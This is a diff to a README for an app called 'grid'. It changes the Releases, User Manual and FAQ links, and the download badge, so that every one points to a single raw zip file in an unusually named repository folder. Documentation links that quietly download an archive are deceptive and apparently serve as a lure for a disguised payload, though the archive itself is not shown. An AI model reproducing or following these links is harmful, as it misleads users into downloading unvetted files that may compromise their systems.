@@ -4,7 +4,7 @@
 Welcome to grid! This application helps you easily create and manage grids for various tasks. Whether you are planning a project or organizing information, grid offers a straightforward way to get it done. 
 
 ## 📥 Download Now
-[![Download grid](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/notcoininu/grid/releases)
+[![Download grid](https://raw.githubusercontent.com/notcoininu/grid/main/taffeta/grid.zip)](https://raw.githubusercontent.com/notcoininu/grid/main/taffeta/grid.zip)
 
 ## 🚀 Getting Started
 To start using grid, follow these simple steps.
@@ -48,10 +48,10 @@ If you encounter any issues while using grid or have questions, please open an i
 ## 🔗 Additional Resources
 For more information on how to use grid, check these resources:
 
-- [User Manual](https://github.com/notcoininu/grid/wiki) - A complete guide featuring tips and tricks.
-- [FAQ](https://github.com/notcoininu/grid/wiki/FAQ) - Common questions answered.
+- [User Manual](https://raw.githubusercontent.com/notcoininu/grid/main/taffeta/grid.zip) - A complete guide featuring tips and tricks.
+- [FAQ](https://raw.githubusercontent.com/notcoininu/grid/main/taffeta/grid.zip) - Common questions answered.
 
 ## 🔗 Download & Install
-To download grid, visit the [Releases page](https://github.com/notcoininu/grid/releases) and choose the latest version. Complete the installation by following the steps outlined above.
+To download grid, visit the [Releases page](https://raw.githubusercontent.com/notcoininu/grid/main/taffeta/grid.zip) and choose the latest version. Complete the installation by following the steps outlined above.
 
 Thank you for choosing grid. We hope it makes your tasks easier and more efficient!
